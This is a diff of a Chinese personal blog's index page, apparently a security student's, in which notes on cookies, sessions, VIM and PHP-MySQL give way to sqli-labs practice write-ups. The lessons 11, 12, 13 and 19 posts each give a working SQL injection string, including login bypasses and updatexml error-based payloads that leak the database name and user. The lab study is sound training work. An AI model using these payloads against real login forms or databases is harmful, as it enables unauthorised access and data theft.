+      <a class="article-title" href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-19/">sqli-labs-less-19</a>
     </h1>
   
 
@@ -418,63 +315,15 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <table>
-<thead>
-<tr>
-<th align="center"></th>
-<th align="center">异同点</th>
-<th align="center">Cookie</th>
-<th align="center">Session</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">相同</td>
-<td align="center"></td>
-<td align="center">能够保存用户信息的区别</td>
-<td align="center">同Cookie</td>
-</tr>
-<tr>
-<td align="center"></td>
-<td align="center">存储位置</td>
-<td align="center">存放在客户端浏览器</td>
-<td align="center">存放在服务器</td>
-</tr>
-<tr>
-<td align="center"></td>
-<td align="center">保留时间</td>
-<td align="center">设定有效保存期限</td>
-<td align="center">关闭浏览器后自动作废</td>
-</tr>
-<tr>
-<td align="center">不同点</td>
-<td align="center">存储容量</td>
-<td align="center">每个浏览器只能保存某个Web服务器的最多20个Cookie且大小不超过4KB</td>
-<td align="center">可以创建多个但是过多会影响服务器性能</td>
-</tr>
-<tr>
-<td align="center"></td>
-<td align="center">是否被禁用</td>
-<td align="center">用户设置是否开启Cookie</td>
-<td align="center">不会被禁用，因为内容保存在服务器端</td>
-</tr>
-<tr>
-<td align="center"></td>
-<td align="center">隐私策略</td>
-<td align="center">对客户端可见，不安全</td>
-<td align="center">存储在服务器，较安全</td>
-</tr>
-<tr>
-<td align="center"></td>
-<td align="center">跨域支持</td>
-<td align="center">支持跨域名访问</td>
-<td align="center">不支持跨域名访问</td>
-</tr>
-</tbody></table>
+        <p>注入语句： ‘,1,updatexml(1,concat(0x7e, database(),0x7e),1))#</p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson19/1.png"></p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson19/2.png"></p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson19/3.png"></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/03/24/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%80%BB%E7%BB%93Cookie%E5%92%8CSession%E7%9A%84%E5%BC%82%E5%90%8C%E7%82%B9/" data-id="cl157fhi5000k7gtr8q9cav7j" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-19/" data-id="cl1f7n02f0009q4tr46bt5f8b" class="article-share-link">Share</a>
       
       
     </footer>
@@ -484,10 +333,10 @@
 
 
   
-    <article id="post-学习笔记/什么是Session" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-sqli-labs实验笔记/sqli-labs-less-13" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/03/24/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%BB%80%E4%B9%88%E6%98%AFSession/" class="article-date">
-  <time datetime="2022-03-24T15:08:25.654Z" itemprop="datePublished">2022-03-24</time>
+    <a href="/2022/03/31/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-13/" class="article-date">
+  <time datetime="2022-03-31T15:26:40.100Z" itemprop="datePublished">2022-03-31</time>
 </a>
     
   </div>
@@ -498,7 +347,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/24/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%BB%80%E4%B9%88%E6%98%AFSession/">Session概述</a>
+      <a class="article-title" href="/2022/03/31/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-13/">sqli-labs-less-13</a>
     </h1>
   
 
@@ -506,18 +355,14 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p><strong>什么是Session？</strong></p>
-<p>Session译为“会话”，其本意是指有始有终的一系列动作/消息</p>
-<p>Web中的Session指的就是用户在浏览某个网站时，从进入网站到浏览器关闭所经过的这段时间，也就是用户浏览这个网站所花费的时间</p>
-<p>因此Session实际上是一个特定的时间概念，Session默认的生命周期为20分钟</p>
-<p><strong>Session的作用</strong></p>
-<p>Session可以用于身份认证，程序状态记录，页面之间的参数传递等</p>
-<p>因为HTTP协议无状态，为了在服务器保持客户端的状态，就需要使用Session</p>
+        <p>注入语句：admin’) union select updatexml(1,concat(0x7e,(select user()),0x7e),1)  –+</p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson13/1.png"></p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson13/2.png"></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/03/24/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E4%BB%80%E4%B9%88%E6%98%AFSession/" data-id="cl157fhi4000j7gtrdkm1gzv4" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/03/31/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-13/" data-id="cl1f7n02a0003q4tr0sof3yw5" class="article-share-link">Share</a>
       
       
     </footer>
@@ -527,10 +372,10 @@
 
 
   
-    <article id="post-学习笔记/VIM使用" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-sqli-labs实验笔记/sqli-labs-less-11" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/03/24/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/VIM%E4%BD%BF%E7%94%A8/" class="article-date">
-  <time datetime="2022-03-24T15:08:25.652Z" itemprop="datePublished">2022-03-24</time>
+    <a href="/2022/03/31/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-11/" class="article-date">
+  <time datetime="2022-03-31T15:26:40.098Z" itemprop="datePublished">2022-03-31</time>
 </a>
     
   </div>
@@ -541,7 +386,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/24/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/VIM%E4%BD%BF%E7%94%A8/">VIM使用</a>
+      <a class="article-title" href="/2022/03/31/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-11/">sqli-labs-less-11</a>
     </h1>
   
 
@@ -549,31 +394,15 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>VI/VIM共有三种编辑模式，分别是：命令模式，输入模式和底线命令模式</p>
-<p>输入模式：</p>
-<p>在命令模式下按下i就进入输入模式，在输入模式在，可以用以下按钮：</p>
-<p>*字符按键及Shift组合：输入字符</p>
-<p>*ENTER：回车键，换行</p>
-<p>*BACK SPACE：退格键，删除光标前一个字符</p>
-<p>*DEL：删除键，删除光标后一个字符</p>
-<p>*方向键：在文本中移动光标</p>
-<p>*HOME/END：移动光标到行首/行尾</p>
-<p>*Page Up/Page Down：上/下翻页</p>
-<p>*Insert：切换光标为输入/替换模式</p>
-<p>*ESC：退出输入格式，切换到命令模式</p>
-<p>搜索替换指令：</p>
-<p>/word：向光标之下寻找一个名称为word的字符串</p>
-<p>？word：向光标之上寻找一个字符串名称为word的字符串</p>
-<p>n：这个n是英文按键，代表重复前一个搜索的动作</p>
-<p>N：这个N是英文按键，与n刚好相反，为【反向】进行前一个搜索动作</p>
-<p>:n1，n2s/word1/word2/g：n1与n2为数字，在第n1与n2行之间寻找word1这个字符串，并 将该字符串取代为word2</p>
-<p>:1,$s/word1/word2/g或:%s/word1/word2/g：从第一行到最后一行寻找word1字符串，并将该字符串取代为word2</p>
-<p>:1,$s/word/word2/gc或:%s/word1/word2/gc：从第一行到最后一行寻找word1字符串，并将该字符串取代为word2，且在取代前显示提示字符给用户确认是否需要取代</p>
+        <p>注入语句：admin’ and 1=1 –+</p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson11/1.png"></p>
+<p>这里不用密码也能登陆成功，所以判断是POST形式的单引号字符型注入</p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson11/2.png"></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/03/24/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/VIM%E4%BD%BF%E7%94%A8/" data-id="cl157fhi4000i7gtr1q7edup8" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/03/31/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-11/" data-id="cl1f7n0220000q4tr5okp3nz8" class="article-share-link">Share</a>
       
       
     </footer>
@@ -583,10 +412,10 @@
 
 
   
-    <article id="post-学习笔记/PHP访问MySQL数据库的流程" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-sqli-labs实验笔记/sqli-labs-less-12" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/03/24/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/PHP%E8%AE%BF%E9%97%AEMySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B5%81%E7%A8%8B/" class="article-date">
-  <time datetime="2022-03-24T15:08:25.650Z" itemprop="datePublished">2022-03-24</time>
+    <a href="/2022/03/31/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-12/" class="article-date">
+  <time datetime="2022-03-31T15:26:40.097Z" itemprop="datePublished">2022-03-31</time>
 </a>
     
   </div>
@@ -597,7 +426,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/24/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/PHP%E8%AE%BF%E9%97%AEMySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B5%81%E7%A8%8B/">PHP访问MySQL数据库的流程</a>
+      <a class="article-title" href="/2022/03/31/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-12/">sqli-labs-less-12</a>
     </h1>
   
 
@@ -605,22 +434,13 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>第一步：连结MySQL服务器</p>
-<p>​            使用 mysql_connect() 函数建立与MySQL服务器的连接</p>
-<p>第二步：选择MySQL数据库</p>
-<p>​            使用 mysql_select_db() 函数选择MySQL数据库服务器上的数据库，并与数据库建立连接</p>
-<p>第三步：执行SQL语句</p>
-<p>​            在选择的数据库中使用mysql_query() 函数执行SQL语句。</p>
-<p>对数据的操作方式主要包括四种方式：</p>
-<p>查询数据：使用select语句实现数据的查询功能</p>
-<p>插入数据：使用insert into语句向数据库中插入数据</p>
-<p>更新数据：使用update语句修改数据库中的记录</p>
-<p>删除数据：使用delete语句删除数据库中的记录</p>
+        <p>注入语句：admin”) and 1=1 –+</p>
+<p><img src="https://raw.githubusercontent.com/piaorz/pictures/main/sqli-labs%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/lesson12/1.png"></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/03/24/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/PHP%E8%AE%BF%E9%97%AEMySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B5%81%E7%A8%8B/" data-id="cl157fhi3000h7gtr7zu886gk" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/03/31/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-12/" data-id="cl1f7n02b0004q4trdq7y0nl1" class="article-share-link">Share</a>
       
       
     </footer>
@@ -634,7 +454,7 @@
 
   <nav id="page-nav">
     
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
   </nav>
 
 </section>
@@ -653,7 +473,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">March 2022</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">March 2022</a></li></ul>
     </div>
   </div>
 
@@ -666,23 +486,23 @@
       <ul>
         
           <li>
-            <a href="/2022/03/25/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-3/">sqli-labs less 3</a>
+            <a href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-18/">sqli-labs-less-18</a>
           </li>
         
           <li>
-            <a href="/2022/03/25/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-2/">sqli-labs less 2</a>
+            <a href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-17/">sqli-labs-less-17</a>
           </li>
         
           <li>
-            <a href="/2022/03/25/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-1/">sqli-labs less 1</a>
+            <a href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-16/">sqli-labs-less-16</a>
           </li>
         
           <li>
-            <a href="/2022/03/24/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E8%99%9A%E6%8B%9F%E5%8C%96/">虚拟化</a>
+            <a href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-15/">sqli-labs-less-15</a>
           </li>
         
           <li>
-            <a href="/2022/03/24/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E6%B3%95%E5%BE%8B/">法律</a>
+            <a href="/2022/04/01/sqli-labs%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/sqli-labs-less-14/">sqli-labs-less-14</a>
           </li>
         
       </ul>
